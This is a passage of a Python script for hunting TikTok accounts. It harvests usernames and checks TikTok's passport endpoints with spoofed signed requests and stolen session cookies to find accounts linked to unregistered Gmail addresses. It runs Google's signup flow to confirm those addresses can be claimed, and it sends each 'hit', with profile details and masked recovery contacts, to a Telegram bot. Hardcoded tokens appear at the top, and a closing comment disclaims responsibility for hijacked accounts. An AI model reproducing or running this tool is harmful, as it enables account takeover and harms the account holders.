      'bm_sv': '8B9270F6DC4EC8A6561E2DF933584D54~YAAQDNXOF2rQ8gyUAQAAwEWWNxouiDYSa1/A8i5epVtIHabZ5N80lN5oe9ckZn13qLTnIPhyqnsk5hz3OIWKhKhfI48pdu5TsD4CI/KMvIvVkX0nHiAN2VqA8ZmRrQb0VF8hPBBIW0iEgp6whYfEOUYB+ZRukuKlyoxeIZOf8/LEMXvjUvYwN2QR8OtTnSy8L6qYm1gF2cRrhiSmCTHkLmkdoq+Sjw28CvwxQEjdoVuYtaEpgoAkxQapzbiI/4oX~1',
      'msToken':'Hbemm0POD06FpnLCQNu8Xn1YnfgHOYZSbiMRs7gILU43GRmPEcOAsJaNgh6UJEAls49ntILk0DeR0gOsODBFm4T_gTxmTz08M0OzeFCYrIWaoePPgGy2R4Uj00R_2MGgx1IEet8PypAl',
  }
              headers = {
      'authority': 'www.tiktok.com',
      'accept': '*/*',
      'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',

      'referer': 'https://www.tiktok.com/search/user?q=ahmed_faroojsq50&t=1736099390234',

      'user-agent': str(nn()),
              }
              params = {
      'WebIdLastTime': '1731681607',
      'aid': '1988',
      'app_language': 'ar',
      'app_name': 'tiktok_web',
      'browser_language': 'ar-IQ',
      'browser_name': 'Mozilla',
      'browser_online': 'true',
      'browser_platform': 'Linux armv81',
      'browser_version': str(nn()),
      'channel': 'tiktok_web',
      'cookie_enabled': 'true',
      'cursor': '70',
      'data_collection_enabled': 'true',
      'device_id': str(i),
      'device_platform': 'web_pc',
      'focus_state': 'true',
      'from_page': 'search',
      'history_len': '6',
      'is_fullscreen': 'false',
      'is_page_visible': 'true',
      'keyword':str(j),
      'odinId': '7339266198948037633',
      'os': 'linux',
      'priority_region': 'IQ',
      'referer': '',
      'region': 'IQ',
      'screen_height': '800',
      'screen_width': '360',
      'search_id': '202501051749510BD3571B3B38F78E0D00',
      'tz_name': 'Asia/Baghdad',
      'user_is_login': 'true',
      'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
      'webcast_language': 'ar',
      'msToken': 'Hbemm0POD06FpnLCQNu8Xn1YnfgHOYZSbiMRs7gILU43GRmPEcOAsJaNgh6UJEAls49ntILk0DeR0gOsODBFm4T_gTxmTz08M0OzeFCYrIWaoePPgGy2R4Uj00R_2MGgx1IEet8PypAl',
      'X-Bogus': 'DFSzswVL4xhANn49t8VdsFcyeGaP',
      '_signature': '_02B4Z6wo00001HnwuZwAAIDA9VDlFgbGYTh58L0AAHkO5e',
  }
              try:
                  r= requests.get('https://www.tiktok.com/api/search/user/full/', params=params, cookies=cookies, headers=headers).json()
              except:
                  continue
              for q in r['user_list']:

                  fo=(q['user_info']['follower_count'])


                  if fo >= 100:
                    u=(q['user_info']['unique_id'])
                    if '..' in u or '_' in u:
                      continue
                    elif len(u)<5 or len(u)>30:
                      continue
                    else:
                      self.ch2(u+'@gmail.com')






          except:
              pass


class ClassS1:
  def __init__(self):
    self.t=0
    self.f=0
    self.tf=0
    self.abc='azertyuiopmlkjhgfdsqwxcvbn'
    self.ses=requests.Session()
    self.name =''.join(random.choice(self.abc) for i in range(random.randrange(5,10)))
    self.birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
    self.a = 'qwertyuiopasdfghjklzxcvbnm'
    
    self.tok=input(f"{HH} Token: {M}")
    self.id=input(f"{HH} ID: {M}")
    self.sey=[]
    self.num=int(input(f"{HH} Enter Number Session Do You Have Tik : {M}"))
    for ss in range(self.num):
        qa=input(f"{HH} {ss+1} Enter Session TikTok : {M}")
        self.sey.append(qa)
 


    	
    

      
    os.system("clear")
    for _ in range(5):
      threading.Thread(target=self.se).start()
  def re(self,email):
      def sign(params, payload: str = None, sec_device_id: str = "", cookie: str = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
          x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
          if not unix:
              unix = int(time.time())
          return Gorgon(params, unix, payload, cookie).get_value() | {
              "x-ladon": Ladon.encrypt(unix, license_id, aid),
              "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
          }

      try:
          secret = secrets.token_hex(16)
          session = requests.Session()
          session.cookies.update({"passport_csrf_token": secret, "passport_csrf_token_default": secret})

          url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
          params = {
              'request_tag_from': "h5",
              'fixed_mix_mode': "1",
              'mix_mode': "1",
              'account_param': user,
              'scene': "5",
              'device_platform': "android",
              'os': "android",
              'ssmix': "a",
              '_rticket': str(round(time.time() * 1000)),
              'cdid': str(uuid.uuid4()),
              'channel': "googleplay",
              'aid': "1233",
              'app_name': "musical_ly",
              'version_code': "370104",
              'version_name': "37.1.4",
              'manifest_version_code': "2023701040",
              'update_version_code': "2023701040",
              'ab_version': "37.1.4",
              'resolution': "720*1448",
              'dpi': "320",
              'device_type': "RMX3269",
              'device_brand': "realme",
              'language': "ar",
              'os_api': "30",
              'os_version': "11",
              'ac': "wifi",
              'is_pad': "0",
              'current_region': "IQ",
              'app_type': "normal",
              'sys_region': "IQ",
              'last_install_time': str(int(time.time())),
              'mcc_mnc': "41840",
              'timezone_name': "Asia/Baghdad",
              'carrier_region_v2': "418",
              'residence': "IQ",
              'app_language': "ar",
              'carrier_region': "IQ",
              'timezone_offset': "10800",
              'host_abi': "arm64-v8a",
              'locale': "ar",
              'ac2': "wifi",
              'uoo': "0",
              'op_region': "IQ",
              'build_number': "37.1.4",
              'region': "IQ",
              'ts': str(int(time.time())),
              'iid': str(random.randint(1, 10**19)),
              'device_id': str(random.randint(1, 10**19)),
              'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
              'support_webview': "1",
              'cronet_version': "f6248591_2024-09-11",
              'ttnet_version': "4.2.195.9-tiktok",
              'use_store_region_cookie': "1"
          }

          x_args = sign(params=urlencode(params), payload="", cookie="")
          headers = {
              'User-Agent': "com.zhiliaoapp.musically/2023701040 (Linux; U; Android 11; ar_IQ; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:f6248591 2024-09-11 QuicVersion:182d68c8 2024-05-28)",
              'Accept': "application/json, text/plain, */*",
              'x-tt-passport-csrf-token': secret,
              'content-type': "application/x-www-form-urlencoded",
              'x-argus': x_args["x-argus"],
              'x-gorgon': x_args["x-gorgon"],
              'x-khronos': x_args["x-khronos"],
              'x-ladon': x_args["x-ladon"]
          }

          response = session.post(url, params=params, headers=headers)
          response.raise_for_status()

          passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]

          login_url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
          params.update({"passport_ticket": passport_ticket})

          for key in ['mix_mode', 'account_param', 'fixed_mix_mode']:
              params.pop(key, None)

          response = session.post(login_url, params=params, headers=headers)
          response.raise_for_status()

          hh = json.loads(response.headers.get("x-tt-verify-idv-decision-conf", "{}"))
          result = {'number': '', 'email': ''}

          for entry in hh.get('extra', []):
              if '+' in entry['masked_account']:
                  result['number'] = entry['masked_account']
              elif '@' in entry['masked_account']:
                  result['email'] = entry['masked_account']

          return result

      except Exception as e:
          print(f"Error occurred: {e}")
          return {'number': '', 'email': ''}
  def info(self,email):
    user=email.split('@')[0]
    try:
      he={'User-Agent':str(nn())}
      ti= requests.get(f'https://www.tiktok.com/@{user}', headers=he).text
      info = str(ti.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
      country = str(info.split('region":"')[1]).split('",')[0]
      like = str(info.split('heart":')[1]).split(',"')[0]
      name = str(info.split('nickname":"')[1]).split('",')[0]
      followers = str(info.split('followerCount":')[1]).split(',"')[0]
      following = str(info.split('followingCount":')[1]).split(',"')[0]
      video = str(info.split('videoCount":')[1]).split(',"')[0]
      id = str(info.split('id":"')[1]).split('",')[0]
      private = str(info.split('privateAccount":')[1]).split(',"')[0]
      rest=self.re(email)
      #لاتخمط
      ff = f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
By: @jokerpython3
═══════════════════
𝙽𝙰𝙼𝙴 : {name}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {user}@gmail.com
Rest : {rest}
Likes : {like}
Country : {country}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {followers}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
𝙸𝙳 : {id}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {private}
𝚅𝙴𝙳𝙾 : {video}
═══════════════════
        '''	
      print(ff)        
      requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + str(ff))
      with open('Hit.txt','a') as x:
        x.write(ff)
    except:
      ff = f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
By: @jokerpython3
═══════════════════
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {user}@gmail.com
Rest : {rest}
═══════════════════
        '''				
      requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + str(ff))
      with open('Hit.txt','a') as x:
              x.write(ff)



  def ch1(self,email):
      headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',

            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',

            'user-agent':str(nn()),

            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["S453210854:1738875354740240"]',
            'x-same-domain': '1',
        }
      params = {
            'biz': 'false',
            'continue': 'https://www.google.com/search?q=odiid&oq=odiid&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBBzUzOGowajGoAgCwAgA&sourceid=chrome-mobile&ie=UTF-8',
            'ec': 'GAlAAQ',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'hl': 'ar',
            'authuser':'0',



      }
      response = self.ses.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
      TL = response.url.split('TL=')[1]
      at = str(response.text).split('"SNlM0e":"')[1].split('"')[0].replace(':', '%3A')
      s1 = str(response.text).split('"Qzxixc":"')[1].split('"')[0]
      headers.update({'x-goog-ext-391502476-jspb': '["{}"]'.format(s1)})
      params = {
            'rpcids': 'MjyMj',
            'source-path': '/lifecycle/steps/signup/name',

            'hl': 'ar',
            'TL': TL,

            'rt': 'c',
        }
      data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.name,at)
      response =self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        ).text
      params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',

            'hl': 'ar',
            'TL':TL,

            'rt': 'c',
        }
      data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3CoW1qbTUCAAYBzfNKIc2NqatmouWwTSP0ADQBEArZ1I8Ch94lfpYfrmnrKHwxJnKWaKN7vmaPg1nZckhu9cYTqaaLl9zl8ICQiMB8gh4rzQAABFmdAAAAJKcBB7EATQJA4FY8cFsp8MFfaz9q6AFO6Kzn-UhxhRTzfpl6KopMZy7G5tgtsVkZP4YbDJNN7rRAJVymInyeE5vDep-2fJKhZpjLnIOO6vaqoMXVVgi20M5Hqs8IpKTOnpX_Yucia2MQu9wzUcQ4rGkBbHbNiXEbB_QSLbcN23KbhIEZLn2OKMQyIOGkthlWltVHbzk3qiZNVE7gTSFhzJHD-S0lhNKktIsSNwBWGOnSbWF0PskCKIWdcKVqR0aHRR5AmXY8ltz408DI3GBrI11_AVadMRaXzD7K9bgJIInK4UhXDlOUY2GOS0dt0A_ZcwNJsZy61_7ATmWbi5O8FZ-pCgBsfEiVjTbMeTeVKQ-AgYLnFF1Ii0WH_Y-JpJpGVT5BsziPX-bMUFVdVa4eMcCGcorkwMkvgmfQolD3guqTAQdihtw0VbBHNFxlkmHuNa1zQHZVvh0efFlfhnrX8YHceq_mh5zVS4O3eUAExyabrFQW2NJDvr0VfFHN0c64C3JAgAuC2JujAim7IV9t3oHNvquEQE1yWYQzyS8Co54nc_CbPcMF5iHN7cZiiUXFLvjdNedJzZ9IHESmt6acC4W4ralK6NbSg4qk3HXsKQe9J1bvQ0pFzlZK8q0EEXPFINP7xioq6V0jeGU9qGmdktBdMWIanTDzu6kIecW5sQEMYx8Bo86G8j8d88xb3DVzeTtjTpOJ1TDAvoMfj0iKP6PBDA2dw1ta4LQPZWJFUwP1_BIl6SjXNDlbCcENDiIvH9H0hvS1l7EhbvJqo9iducM8cnr0z47rVEcmNW1JriRaa2QnjqN6cMD8gLqroivmX2LTSl6iTdhL4YZMKTDbL7nAAuGbhxj2IqyeNwlHeO62KWxrAYtBKMq2-bNBsWns1ZMo9zrrYM4if30mVaSeEoPzkkfq28OuvH35JbT9RzTAO4Tb_HI7l-5AvA-Du5I-dVfBmCUcXek_2R4CUcIkQJkh1V5x6o4kLDjymG3YkUDzuMVeGFUlL8C8zPVmya1WV5FKbV_2XjfKCvNKoqMXGrEezTIoKJ_0_PwNGRkIcAckLkhKyzHiAOxSSYTV7_9GwWI3kct2ifRjGs5MRCfK0FgdafCQuDtmr_njqS0wj4qqLW_2PfKyHKCLaMTZMMShcXMG4X0_5898av9tI4HXYb8OAegshjnS42GJ41_vLNDmb_HS_lEEUPT2pmujipjE4rLCyooQHLI_XR9B6yb9gkB0Co44fGqDXPBxr6LyVyZlnGbEicqbpERhIFG_9GjsjQVZfquJuNQ_ds7w6G3YL4XLxmjsWWkipQXmLRF-E8YimF9M1OUNKzqUeq149TCEMLLDDRrF4-k7866Xy1L7xjDjE-3QS-nGzHbK8wOgIu3v-4fldiumMm26FJRuk9WuTeYG7xXeQSyg0p0oYrDq2KlH4YAwUZL7d6z8-mN22IFpaK6H9wGLZzcBTaHtkrSfyLLEv3aRgvg2p1zyzmu1Ybkw3OwBJyBZgHCmrVim3f_Cvxn4w2deq-9YA0ok_x3_nzrEi8khS4RM6enmJLFc2yLWTk3Dmb4He2cyyjaOoypcTywMXp9ZBd01vUB6QaQ4THa2uS3C5N5yiyJBermtbU17daoFg8OJHKkGiEq59_WnPoTXa2c-WOrEmT27GCn2aFt4UPWUHID6ZqUd9iMGaz6NhFtVp-qFyUY8ejpyaqgaMYD9jguM0NlgauZv6LloS54HtLoqgEMTGiQDwfqFvcbTcFmf_O2LPKYvNOj4fUAkBbth8MzHBUeDQEMjm-9noSQGq8LG3cJN5L9a2rhC36zsYo2Uo3jexXOfgZOBHHOfxSbWKgSVGL9dEvEHwsyf2sSJxUIcAAp6ECVaWqEY1pdaaNLefKJ2DO-AYj4E31aN3ftlP0UF_0ydLl7EMDxYSDp8xNq2KCjAC9Q6vBf6o4rBRZwKSXYKwluyNDT_ZhDowhq-tHMDSxB4eDbaFnA1q6B2vvAKNYJU3heQ4KRwrKZ6fUwUfyymQ2wjdeVXDOCiNk56dSvJNVEMToNlcCTHInl9XG1QfZusRflcibYKYnrtqklEZVEpv74y5h2JypKKiXsRo_bQj-UBnSFWKY4U50EzDLRyNRlrP5B68WpV5aSAwxzMR_wsIaHhAWQNorE1n5FIOuSD0I0laAmSw7KbESwYfebw9MPTdGXZH7o9wMnJzFKOUG0h1XVMD-loA-X99dkqMAK1oMUFXIo3J2cLm8AjA116lFdfrIJ8zBrOxXO188nowci8AbJRrcJzgkC29t5e7_Q5xRXknPdrOO-W7tSySsgdRlLVQLP4Sw_ChmlPGTpGG9FzCAqpMowBi8sjjXdZGL0jVQ5KOTZT0XsfF1LBe6EwvoFfjB1LArKqmXKykG6UbFW0F6s692TvkhmEzeK2HL9seyZ8L8THugqYmKHywBdVzvdRGri8blQUk1tWQG9imNMkfE7qcvZtViMJbe1-b94ZIwbnEv4iGd1oYEqL4F5xzMPg_LOftp8paGHq0XhSCibleGbdTw-Hf-NEXTDZE4TWV1UHpKCksoqgTtZs0wd11awf8qAruyPf4pf8VQgU1phyDzHEQbXlMwU3K4iCgCd4w-FuhisNwrW-5wdGl1WrH_Qw6VAvOkoAYPkgjKq_NiKknSW2WrsJtzPsq2Y_OrNM4rdxvrhveZGztQIn6QgBZBym4kfgNkmOmym7KibdZBCqHs8wqrRv9LYG9AowtvBhyWlGTf6OLvRO66Nct8rkdHYBIubxKRVIyAx2LtUwHKtsheX32-MGDyTuD0C1Evh3yeWN5RQGfw2hUyZq9U0mUbLn_LJX_w6fxRBDk6-FjsLTfgFV-listZpVbw4eyJt2KJDSAynICBlmF4vXu-VY9gWgmq4oFPHZfQP9HN5Cegn9R8aK353Y2pKGhDUcDRhLfwMHOAVzGbnjzgMwfsMeK40tgBDE2PkwuuACp_FuJy3EDEJf5pfiA38O0CuLz2AiXeRztWEkuCVNcwTH7QMRsJcI28SuZNwl0uQx2_yNboa9TWb-DSv3CfEr9AKSU7Fy0pVmjzMEBzbiHib2tuw0HzX9dE03Tg%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dodiid%26oq%3Dodiid%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOdIBBzUzOGowajGoAgCwAgA%26sourceid%3Dchrome-mobile%26ie%3DUTF-8%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.birthday[0],self.birthday[1],self.birthday[2],at)
      fr = self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        ).text
      params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',

            'hl': 'ar',
            'TL':TL,
            'rt': 'c',
        }
      if "@" in email:
          em=email.split("@")[0]
      data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C13922%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(em,at)
      rse =self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        ).text

      if "password" in rse:
          self.info(email)
          self.t+=1
          os.system('cls'if os.name=='nt'else'clear')
          lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
          print(lo)		  
      elif '400' in rse or '401'  in rse:
      	self.ch1(email)       
      else:
              
              self.tf+=1
              os.system('cls'if os.name=='nt'else'clear')
              lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
              print(lo)		         			         	
		         	

   					        



  def ch2(self,email):



      def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
          x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
          data = payload
          if not unix:
              unix = int(time.time())
          return Gorgon(params, unix, payload, cookie).get_value() | {
              "x-ladon": Ladon.encrypt(unix, license_id, aid),
              "x-argus": Argus.get_sign(
                  params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id,
                  sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version
              )
          }


      encrypted = [hex(ord(c) ^ 5)[2:] for c in email]
      em = "".join(encrypted)

      session = requests.Session()
      sestik=random.choice(self.sey)
      secret = secrets.token_hex(16)
      cookies = {
          "passport_csrf_token": secret,
          "passport_csrf_token_default": secret,
          "sessionid": sestik,
      }
      
      session.cookies.update(cookies)


      device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
      device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
      regions = ["AE", "IQ", "US", "FR", "DE"]
      languages = ["ar", "en", "fr", "de"]

      params = {
          'passport-sdk-version': "6031490",
          'device_platform': "android",
          'os': "android",
          'ssmix': "a",
          '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
          'cdid': str(uuid.uuid4()),
          'channel': "googleplay",
          'aid': "1233",
          'app_name': "musical_ly",
          'version_code': "370104",
          'version_name': "37.1.4",
          'manifest_version_code': "2023701040",
          'update_version_code': "2023701040",
          'ab_version': "37.1.4",
          'resolution': "720*1448",
          'dpi': str(random.choice([420, 480, 532])),
          'device_type': random.choice(device_types),
          'device_brand': random.choice(device_brands),
          'language': random.choice(languages),
          'os_api': str(random.randint(28, 34)),
          'os_version': str(random.randint(10, 14)),
          'ac': "wifi",
          'is_pad': "0",
          'current_region': random.choice(regions),
          'app_type': "normal",
          'sys_region': random.choice(regions),
          'last_install_time': str(random.randint(1600000000, 1700000000)),
          'mcc_mnc': "41840",
          'timezone_name': "Asia/Baghdad",
          'carrier_region_v2': "418",
          'residence': random.choice(regions),
          'app_language': random.choice(languages),
          'carrier_region': random.choice(regions),
          'timezone_offset': str(random.randint(0, 14400)),
          'host_abi': "arm64-v8a",
          'locale': random.choice(languages),
          'ac2': "wifi",
          'uoo': "0",
          'op_region': random.choice(regions),
          'build_number': "37.1.4",
          'region': random.choice(regions),
          'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
          'iid': str(random.randint(1, 10**19)),
          'device_id': str(random.randint(1, 10**19)),
          'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
          'support_webview': "1",
          'reg_store_region': random.choice(regions).lower(),
          'user_selected_region': "0",
          'cronet_version': "f6248591_2024-09-11",
          'ttnet_version': "4.2.195.9-tiktok",
          'use_store_region_cookie': "1"
      }


      payload = {
        'email': email,
    }

      app_name = "com.zhiliaoapp.musically"
      app_version = f"{random.randint(2000000000, 3000000000)}"
      platform = "Linux"
      os_version = f"Android {random.randint(10, 15)}"
      locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
      locale = random.choice(locales)
      device_type = random.choice(["phone", "tablet", "tv"])
      build = f"UP1A.{random.randint(200000000, 300000000)}"
      cronet_version = f"{random.randint(10000000, 20000000)}"
      cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
      quic_version = f"{random.randint(10000000, 20000000)}"
      quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"

      user_agent = (f"{app_name}/{app_version} ({platform}; U; {os_version}; {locale}; {device_type}; "
                    f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                    f"QuicVersion:{quic_version} {quic_date})")


      x_args = sign(params=urlencode(params), payload="", cookie="")

      headers = {
          'User-Agent': user_agent,
          'x-tt-passport-csrf-token': secret,
          'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
          'x-argus': x_args["x-argus"],
          'x-gorgon': x_args["x-gorgon"],
          'x-khronos': x_args["x-khronos"],
          'x-ladon': x_args["x-ladon"],
      }

      url ="https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"

      rei = session.post(url, params=params, data=payload, headers=headers).text
      print(rei)
      if '1023' in rei:
          self.ch1(email)
          os.system('cls'if os.name=='nt'else'clear')
          lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
          print(lo)
  


      else:
        self.f+=1
        os.system('cls'if os.name=='nt'else'clear')
        lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
        print(lo)	    
  def se(self):
  	with open('S1.txt','r') as ty:
  		tu=ty.read().splitlines()
  	for use in tu:
  		if '_' in use or '..' in use:
  			continue
  		elif  len(use)<5 or len(use)>30:
  			continue
  		else:
  			self.ch2(use+'@gmail.com')

print(f'''{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
{A}[=] 𝟭 • 𝗥𝗮𝗻𝗱𝗼𝗺 𝗖𝗵𝗲𝗰𝗸
{A}[=] 𝟮 • 𝗖𝗵𝗲𝗰𝗸 𝗟𝗶𝘀𝘁
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━''')
vb = input(f'{Z}𝗘𝗻𝘁𝗲𝗿 𝗰𝗵𝗼𝗶𝗰𝗲 ? ● ')
if vb=='1':
	os.system('clear')
	S1()
elif vb=='2':
	os.system('clear')
	ClassS1()
else:
	print('موطلي')
	exit()
#ما اتحمل ذنب او مسوالية اي حساب تصيده من ادواتي الي انشرها بي كل مكان
